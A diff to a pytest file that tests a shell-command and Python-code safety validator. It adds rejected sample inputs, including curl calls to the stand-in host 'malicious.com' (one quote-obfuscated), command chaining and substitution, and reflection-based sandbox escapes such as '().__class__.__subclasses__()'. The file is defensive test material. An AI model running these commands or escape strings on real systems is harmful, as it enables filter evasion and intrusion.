@@ -42,7 +42,7 @@ def test_verify_safe_shell_command_valid():
     safe_cmds = [
         "ls -la",
         "echo 'Hello World'",
-        "python3 --version",
+        "git --version",
         "pytest -v tests"
     ]
     for cmd in safe_cmds:
@@ -58,9 +58,30 @@ def test_verify_safe_shell_command_invalid():
         "sudo apt-get install git",
         "chmod +x script.sh",
         "cat secrets.txt > output.txt",
-        "ls && rm -f file"
+        "ls && rm -f file",
+        "/usr/bin/curl http://malicious.com",
+        "c''url http://malicious.com",
+        "python3 -c 'import os'",
+        "echo $(whoami)",
+        "cat < input.txt"
     ]
     for cmd in unsafe_cmds:
         with pytest.raises(ValueError) as excinfo:
             verify_safe_shell_command(cmd)
+        assert "Säkerhetsfel" in str(excinfo.value)
+
+def test_verify_safe_python_code_invalid_dunder_and_bypasses():
+    # Attempted AST sandbox bypasses using reflection or dunder attributes
+    unsafe_codes = [
+        "().__class__.__subclasses__()",
+        "__import__('os').system('ls')",
+        "getattr(sys, 'exit')(0)",
+        "import importlib",
+        "import builtins",
+        "x = '__class__'",
+        "y = 'eval'"
+    ]
+    for code in unsafe_codes:
+        with pytest.raises(ValueError) as excinfo:
+            verify_safe_python_code(code)
         assert "Säkerhetsfel" in str(excinfo.value)
